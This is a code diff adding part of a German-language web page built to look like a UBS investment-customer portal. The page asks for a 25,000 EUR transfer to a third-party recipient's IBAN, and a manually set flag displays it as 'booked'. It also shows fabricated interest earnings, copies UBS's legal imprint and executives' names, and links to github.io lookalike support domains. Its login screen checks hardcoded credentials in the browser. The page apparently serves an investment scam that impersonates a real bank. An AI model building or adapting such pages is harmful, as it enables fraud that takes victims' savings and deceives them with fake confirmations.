+      <p>Ihre Anfrage wurde erfolgreich übermittelt.<br>In Kürze erhalten Sie eine E-Mail mit der Bestätigung Ihrer gebuchten Anlage.</p>
+      <button onclick="this.parentElement.parentElement.remove()" style="margin-top:20px;padding:10px 20px;background:green;color:white;border:none;border-radius:6px;cursor:pointer;">Fenster schließen</button>
+    </div>`;
+  document.body.appendChild(modal);
+}
+
+// Initialer Aufruf
+ladePakete();
+</script>
+        
+      </div>
+      <div class="section-content" id="section-transaktionen" style="display:none;">
+<!-- Letzte Transaktionen -->
+<div style="background: #fff; padding: 30px; border-radius: 12px; margin-top: 30px; font-family: Arial, sans-serif;">
+  <h2 style="display: flex; align-items: center; gap: 10px; font-size: 20px; margin-bottom: 20px;">
+    <i class="fa-solid fa-receipt" style="color: red;"></i>
+    <strong>Letzte Transaktionen</strong>
+  </h2>
+
+  <!-- Transaktion 1 -->
+  <div id="transactionBox" style="border-left: 4px solid red; border-radius: 10px; padding: 16px; margin-bottom: 20px;">
+    <div style="display: flex; justify-content: space-between; align-items: center;">
+      <strong id="statusText"><i class="fa-solid fa-clock"></i> Zahlung ausstehend</strong>
+      <span id="dateText" style="color: red;"><i class="fa-solid fa-calendar"></i> 29.07.2025 &ndash; 10:19</span>
+    </div>
+    <p><strong>Transaktions-ID:</strong> UBS4558SIGNY</p>
+    <p><strong>Zahlungsinst.:</strong> ECOSTARC SIGNY</p>
+    <p><strong>Referenz:</strong> ECOM964185F</p>
+    <p><strong>IBAN:</strong> CH42 0900 0000 1670 1311 7</p>
+    <p><strong>Betrag:</strong> <span id="amount" style="color: red;">25.000,00 EUR</span></p>
+    <p id="paymentNote" style="font-style: italic; margin-top: 8px;">Diese Zahlung ist fällig und steht noch aus. Bitte begleichen Sie den offenen Betrag zeitnah.</p>
+  </div>
+
+  <!-- Hinweis unten -->
+  <div style="margin-top: 25px; font-size: 14px; color: #444; line-height: 1.4;">
+    <strong>Hinweis:</strong> Alle Transaktionen erfolgen über das Zahlungsnetzwerk der UBS Switzerland AG und werden entsprechend den geltenden Sicherheitsrichtlinien der FINMA, dem Geldwäschegesetz (GwG) und der DSGVO verarbeitet.
+  </div>
+</div>
+
+<script>
+  // 🔧 HIER STATUS MANUELL ANPASSEN:
+  // true = Zahlung gebucht, false = Zahlung ausstehend
+  const isPaid = true;
+
+  const box = document.getElementById("transactionBox");
+  const statusText = document.getElementById("statusText");
+  const dateText = document.getElementById("dateText");
+  const amount = document.getElementById("amount");
+  const note = document.getElementById("paymentNote");
+
+  if (isPaid) {
+    box.style.background = "#e0f8e0";
+    box.style.borderLeft = "4px solid green";
+    statusText.innerHTML = '<i class="fa-solid fa-check-circle" style="color: green;"></i> Zahlung gebucht';
+    statusText.style.color = "green";
+    dateText.style.color = "green";
+    amount.style.color = "green";
+    note.innerText = "Die Anlagesumme wurde erfolgreich gebucht.";
+    note.style.color = "green";
+  } else {
+    box.style.background = "#ffecec";
+    box.style.borderLeft = "4px solid red";
+    statusText.innerHTML = '<i class="fa-solid fa-clock" style="color: red;"></i> Zahlung ausstehend';
+    statusText.style.color = "red";
+    dateText.style.color = "red";
+    amount.style.color = "red";
+    note.innerText = "Diese Zahlung ist fällig und steht noch aus. Bitte begleichen Sie den offenen Betrag zeitnah.";
+    note.style.color = "red";
+  }
+</script>
+
+ 
+</p><br>
+      </div>
+      <div class="section-content" id="section-referenzkonto" style="display:none;">
+<div style="background: #fff; padding: 30px; border-radius: 12px; font-family: Arial, sans-serif;">
+  <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 20px;">
+    <i class="fa-solid fa-building-columns" style="color: red; font-size: 20px;"></i>
+    <h2 style="font-size: 20px; margin: 0;">Abwicklungsinstitut für Ihre Einzahlung</h2>
+  </div>
+
+  <div style="display: flex; flex-wrap: wrap; gap: 20px;">
+    <!-- Spalte 1: Bankdaten -->
+    <div style="flex: 1 1 48%; background: #f9f9f9; padding: 20px; border-radius: 10px;">
+      <p><i class="fa-solid fa-user" style="color: red;"></i> <strong>Empfänger:</strong> ECOSTARC SIGNY</p>
+      <p><i class="fa-solid fa-globe" style="color: red;"></i> <strong>IBAN:</strong> CH42 0900 0000 1670 1311 7</p>
+      <p><i class="fa-solid fa-shuffle" style="color: red;"></i> <strong>BIC (SWIFT):</strong> POFICHBEXXX</p>
+      <p><i class="fa-solid fa-landmark" style="color: red;"></i> <strong>Zentralbank:</strong> PostFinance AG</p>
+      <p><i class="fa-solid fa-pen" style="color: red;"></i> <strong>Verwendungszweck:</strong> ECOM964185F</p>
+    </div>
+
+    <!-- Spalte 2: Kursbox -->
+    <div id="wechselkurs-box" style="flex: 1 1 48%; background: #f9f9f9; padding: 20px; border-radius: 10px;">
+      <p><strong>EUR → CHF Wechselkurs</strong></p>
+      <p style="color: #444;">Kurs konnte nicht geladen werden.</p>
+      <p style="margin-top: 14px; font-size: 13px; color: grey;">
+        Letztes Update: <i class="fa-solid fa-calendar-days" style="color: red;"></i> <span id="kurs-datum">-</span>
+      </p>
+    </div>
+  </div>
+
+  <!-- Hinweisbox unten -->
+  <div style="background: #f1f1f1; padding: 20px; border-radius: 10px; margin-top: 30px;">
+    <p><strong style="color: red;">Wichtig:</strong> Bitte geben Sie als Empfänger ausschließlich <strong>ECOSTARC SIGNY</strong> an. Als Verwendungszweck tragen Sie bitte ausschließlich die oben genannte Referenznummer ein.</p>
+    <hr>
+    <p><strong>Hinweis zur Einzahlung und Abwicklung:</strong><br>
+    Das Abwicklungsinstitut ECOSTARC SIGNY übernimmt für Sie die grenzüberschreitende Zahlungsabwicklung sowie den automatischen Währungswechsel von CHF in EUR. So wird sichergestellt, dass keine Kursverluste entstehen und Ihr Anlagebetrag in voller Höhe korrekt gutgeschrieben wird.<br>
+    Die Einzahlung erfolgt gemäß den Bestimmungen des Geldwäschegesetzes (GwG) sowie den geltenden EU-Richtlinien zur Verhinderung von Geldwäsche und Terrorismusfinanzierung.<br>
+    <strong>Nur Einzahlungen vom hinterlegten Referenzkonto</strong> sind zulässig. Zahlungen durch Dritte werden abgewiesen.</p>
+  </div>
+</div>
+
+<script>
+function ladeWechselkurs() {
+  fetch('https://open.er-api.com/v6/latest/EUR')
+    .then(res => res.json())
+    .then(data => {
+      const kurs = data.rates.CHF;
+      const datum = new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' });
+      document.getElementById('wechselkurs-box').innerHTML = `
+        <p><strong>EUR → CHF Wechselkurs</strong></p>
+        <p style="color: #444;">1 EUR = ${kurs.toFixed(4)} CHF</p>
+        <p style="margin-top: 14px; font-size: 13px; color: grey;">
+          Letztes Update: <i class="fa-solid fa-calendar-days" style="color: red;"></i> ${datum}
+        </p>
+      `;
+    })
+    .catch(() => {
+      document.getElementById('wechselkurs-box').innerHTML = `
+        <p><strong>EUR → CHF Wechselkurs</strong></p>
+        <p style="color: #444;">Kurs konnte nicht geladen werden.</p>
+        <p style="margin-top: 14px; font-size: 13px; color: grey;">
+          Letztes Update: <i class="fa-solid fa-calendar-days" style="color: red;"></i> ${new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' })}
+        </p>
+      `;
+    });
+}
+
+ladeWechselkurs();
+setInterval(ladeWechselkurs, 60000); // alle 60 Sekunden aktualisieren
+</script>
+      </div>
+      <div class="section-content" id="section-support" style="display:none;">
+        <!-- Support Section im UBS-Stil -->
+<div style="background: #fff; padding: 24px; border-radius: 12px; font-family: Arial, sans-serif;">
+  <h3 style="display: flex; align-items: center; font-size: 18px; gap: 10px; margin-bottom: 10px;">
+    <i class="fa-solid fa-headset" style="color: red;"></i>
+    <strong>Support</strong>
+  </h3>
+  <p style="margin: 0;">Wir sind für Sie da!<br><strong>Mo–Fr:</strong> 9–17 Uhr</p>
+  <p style="margin: 0;">+41 44 707 29 00 <br><strong></strong></p>
+
+
+  <p style="margin-top: 15px;">
+    <a href="https://online-kundenzugang.github.io/support/" target="_blank" style="color: red; font-weight: bold; text-decoration: none;">
+      ➤ Zum Kundendienst wechseln
+    </a>
+  </p>
+</div>
+
+<!-- Footer im UBS-Look -->
+<footer style="background: #f9f9f9; padding: 24px; margin-top: 30px; border-radius: 12px; font-family: Arial, sans-serif; font-size: 14px;">
+  <h4 style="margin-top: 0;"><strong>Impressum:</strong></h4>
+  <p style="margin: 0;">
+    UBS Switzerland AG<br>
+    Bahnhofstrasse 45<br>
+    CH-8001 Zürich<br>
+    Schweiz<br><br>
+
+ 
+
+    <strong>Rechtsform:</strong> Aktiengesellschaft nach Schweizer Obligationenrecht<br>
+    <strong>Handelsregister-Nummer:</strong> CHE-101.329.561<br>
+    <strong>LEI (Legal Entity Identifier):</strong> BFM8T61CT2L1QCEMIK50<br>
+    <strong>Aufsichtsbehörde:</strong> UBS AG wird reguliert durch die Eidgenössische Finanzmarktaufsicht (FINMA).<br><br>
+
+    <strong>Vertretungsberechtigter Verwaltungsrat:</strong><br>
+    Colm Kelleher (Verwaltungsratspräsident)<br>
+    <strong>Chief Executive Officer (CEO):</strong> Sergio P. Ermotti<br><br>
+
+    © UBS 2025. Alle Rechte vorbehalten.
+  </p>
+</footer>
+
+      </div>
+    </div>
+
+    <div class="footer-nav" id="footer-nav">
+      <div class="footer-item" onclick="showSection('anlagekonto')"><i class="fas fa-piggy-bank"></i><span>Konto</span></div>
+      <div class="footer-item" onclick="showSection('kontoinhaber')"><i class="fas fa-user"></i><span>Referenzkonto</span></div>
+      <div class="footer-item" onclick="showSection('paket')"><i class="fas fa-box"></i><span>Paket</span></div>
+      <div class="footer-item" onclick="showSection('referenzkonto')"><i class="fas fa-box"></i><span>Abwicklungskto</span></div>
+      <div class="footer-item" onclick="showSection('transaktionen')"><i class="fas fa-history"></i><span>Trans</span></div>
+    </div>
+  </div>
+
+  <script>
+    const USERNAME = "tyrach";
+    const PASSWORD = "wkVYKh34";
+
+    function showSection(id) {
+      const sections = document.querySelectorAll('.section-content');
+      sections.forEach(section => section.style.display = 'none');
+      const section = document.getElementById(`section-${id}`);
+      if (section) section.style.display = 'block';
+
+      const footerItems = document.querySelectorAll('.footer-item');
+      footerItems.forEach(item => item.classList.remove('active'));
+      footerItems.forEach(item => {
+        if (item.getAttribute('onclick')?.includes(id)) {
+          item.classList.add('active');
+        }
+      });
+    }
+
+    function logout() {
+      sessionStorage.removeItem("loggedIn");
+      location.reload();
+    }
+
+    function login() {
+      const user = document.getElementById("login-user").value;
+      const pass = document.getElementById("login-pass").value;
+      if (user === USERNAME && pass === PASSWORD) {
+        sessionStorage.setItem("loggedIn", "true");
+        location.reload();
+      } else {
+        alert("Falscher Benutzername oder Passwort");
+      }
+    }
+
+    function validateLogin() {
+      const u = document.getElementById("login-user")?.value.trim();
+      const p = document.getElementById("login-pass")?.value.trim();
+      const btn = document.getElementById("loginBtn");
+      if (btn && u && p) {
+        btn.disabled = false;
+        btn.style.background = "#f10a0a";
+        btn.style.color = "white";
+        btn.style.border = "none";
+        btn.style.cursor = "pointer";
+      } else if (btn) {
+        btn.disabled = true;
+        btn.style.background = "transparent";
+        btn.style.color = "#999";
+        btn.style.border = "2px solid #f10a0a";
+        btn.style.cursor = "not-allowed";
+      }
+    }
+
+    function updateProgressSection(idSuffix, totalInterest, startDate) {
+      const daysTotal = 365;
+      const today = new Date();
+      const timeDiff = today - startDate;
+      const daysPassed = Math.floor(timeDiff / (1000 * 60 * 60 * 24));
+      let earned = (totalInterest / daysTotal) * daysPassed;
+      earned = Math.min(earned, totalInterest);
+      const percent = Math.min((earned / totalInterest) * 100, 100);
+      const daysLeft = Math.max(daysTotal - daysPassed, 0);
+
+      document.getElementById(`progress-fill-${idSuffix}`).style.width = percent + "%";
+      document.getElementById(`progress-percent-${idSuffix}`).innerText = Math.round(percent) + "%";
+      document.getElementById(`earned-${idSuffix}`).innerText = earned.toLocaleString("de-DE", { style: "currency", currency: "EUR" });
+      document.getElementById(`days-left-${idSuffix}`).innerText = daysLeft;
+    }
+
+    window.onload = () => {
+      if (!sessionStorage.getItem("loggedIn")) {
+        document.body.innerHTML = `
+          <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;font-family:'Inter',sans-serif">
+            <div style="background:#fff;padding:40px;border-radius:4px;box-shadow:0 10px 30px rgba(0,0,0,0.08);max-width:400px;width:100%;text-align:center;">
+              <img src="https://github.com/securedigitalkonto/kundename/blob/main/logo1.png?raw=true" alt="Logo" style="height:45px;margin-bottom:20px">
+              <h2 style="font-size:1.25rem;margin-bottom:30px;font-weight:800">Anmeldung – Kundenzugang</h2>
+              <form onsubmit="event.preventDefault(); login();">
+                <div style="margin-bottom:20px;text-align:left;">
+                  <label for="login-user" style="font-weight:700;font-size:0.9rem;display:block;margin-bottom:6px;">Benutzername</label>
+                  <input id="login-user" type="text" placeholder="Benutzername" oninput="validateLogin()" style="width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;background:#f9f9f9;font-size:0.95rem;">
+                </div>
+                <div style="margin-bottom:20px;text-align:left;">
+                  <label for="login-pass" style="font-weight:700;font-size:0.9rem;display:block;margin-bottom:6px;">Passwort</label>
+                  <input id="login-pass" type="password" placeholder="Passwort" oninput="validateLogin()" style="width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;background:#f9f9f9;font-size:0.95rem;">
+                </div>
+                <button id="loginBtn" type="submit" disabled style="background:transparent;color:#999;border:2px solid #f10a0a;padding:12px;width:100%;border-radius:4px;font-weight:bold;font-size:1rem;cursor:not-allowed;">Anmelden</button>
+              </form>
+            </div>
+          </div>
+        `;
+      } else {
+        document.getElementById("main-dashboard").style.display = "block";
+        showSection('anlagekonto');
+        updateProgressSection("1", 3750.00, new Date("2025-07-22"));  // first section
+        updateProgressSection("2", 2350.50, new Date("2025-07-22"));  // second section
+      }
+    }
+  </script>
+  
+</body>
+</html>
